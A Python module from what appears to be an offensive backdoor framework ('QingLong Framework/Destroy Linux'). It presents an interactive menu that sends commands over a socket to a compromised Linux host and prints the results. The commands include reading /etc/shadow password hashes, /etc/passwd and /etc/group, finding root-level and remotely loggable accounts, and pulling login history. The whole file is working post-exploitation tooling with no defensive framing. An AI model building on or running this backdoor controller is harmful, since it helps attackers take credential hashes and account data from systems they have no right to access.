import struct
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI
from AuxiliaryFunctions import MyTable
from prompt_toolkit.history import InMemoryHistory


def UserAndGroup(conn):
    commands = ["back", "show functions"]
    completer = WordCompleter(commands)
    formatted_text1 = ANSI('\033[1;32;32m(QingLong Framework/Destroy Linux)-\033[0m\033[1;31;31m[BackDoor/Information ~ User And Group] \033[0m')
    history = InMemoryHistory()
    while True:
        choice = prompt(formatted_text1, completer=completer, history=history)
        if choice.lower() == 'show functions':
            show_functions()
            continue
        elif choice == 'back':
            break
        elif choice == "":
            continue
        elif choice == '1':
            print('\033[1;32;32m' + "[+] 列出系统上的所有用户:" + '\033[0m')
            command = "cat /etc/passwd"
            receive(conn, command)
        elif choice == '2':
            print('\033[1;32;32m' + "[+] 查看用户Hash:" + '\033[0m')
            command = "cat /etc/shadow"
            receive(conn, command)
        elif choice == '3':
            print('\033[1;32;32m' + "[+] 列出系统上的所有组:" + '\033[0m')
            command = "cat /etc/group"
            receive(conn, command)
        elif choice == '4':
            print('\033[1;32;32m' + "[+] 当前用户所在的组:" + '\033[0m')
            command = "groups"
            receive(conn, command)
        elif choice == '5':
            print('\033[1;32;32m' + "[+] 列出所有的超级用户账户:" + '\033[0m')
            command = "grep -v -E \"^#\" /etc/passwd | awk -F: '$3 == 0 { print $1}'"
            receive(conn, command)
        elif choice == '6':
            print('\033[1;32;32m' + "[+] 查看可远程登录的账号:" + '\033[0m')
            command = "awk '/\\$1|\\$6/{print $1}' /etc/shadow"
            receive(conn, command)
        elif choice == '7':
            print('\033[1;32;32m' + "[+] 查看当前用户:" + '\033[0m')
            command = "whoami"
            receive(conn, command)
        elif choice == '8':
            print('\033[1;32;32m' + "[+] 当前服务器用户的详细信息:" + '\033[0m')
            command = "w"
            receive(conn, command)
        elif choice == '9':
            print('\033[1;32;32m' + "[+] 之前在本地系统上的所有用户的信息:" + '\033[0m')
            command = "who"
            receive(conn, command)
        elif choice == '10':
            print('\033[1;32;32m' + "[+] 检索和展示系统中用户的登录信息:" + '\033[0m')
            command = "last"
            receive(conn, command)
        elif choice == '11':
            print('\033[1;32;32m' + "[+] 显示系统中所有用户最近一次登录的信息:" + '\033[0m')
            command = "lastlog"
            receive(conn, command)


def receive(conn, command):
    conn.sendall(command.encode("utf-8"))
    result_len = conn.recv(4)
    real_len = struct.unpack("i", result_len)[0]
    while True:
        if 1024 < real_len:
            result = conn.recv(1024).decode("utf-8", errors="ignore")
            print(result)
            real_len = real_len - 1024
            continue
        else:
            result = conn.recv(1024).decode("utf-8", errors="ignore")
            print(result)
            break


def show_functions():
    print("\n" + '\033[1;34;34m' + "User And Group" + '\033[0m' + "\n" + '=' * len("User And Group") + "\n")
    headers = ['\033[1;34;34m' + "id" + '\033[0m', '\033[1;34;34m' + "model", '\033[1;34;34m' + "description" + '\033[0m']
    mydata = [["1", "List all users on the system", "列出系统上的所有用户"], ["2", "View Hash for All Users", "查看用户Hash(文件的属组通常为root用户或者具有管理系统账户的特权组)"],
              ["3", "List all groups on the system", "列出系统上的所有组"],
              ["4", "The current user's group", "当前用户所在的组"], ["5", "List all super user accounts", "列出所有的超级用户账户"],
              ["6", "View remotely logged in accounts", "查看可远程登录的账号(文件的属组通常为root用户或者具有管理系统账户的特权组)"], ["7", "View Current User", "查看当前用户"],
              ["8", "Detailed information of the current server user", "当前服务器用户的详细信息"], ["9", "Information of all users previously on the local system", "之前在本地系统上的所有用户的信息"],
              ["10", "Retrieve and display user login information in the system", "检索和展示系统中用户的登录信息"],
              ["11", "Display the latest login information of all users in the system", "显示系统中所有用户最近一次登录的信息"]
              ]
    MyTable.createTable(headers, mydata)
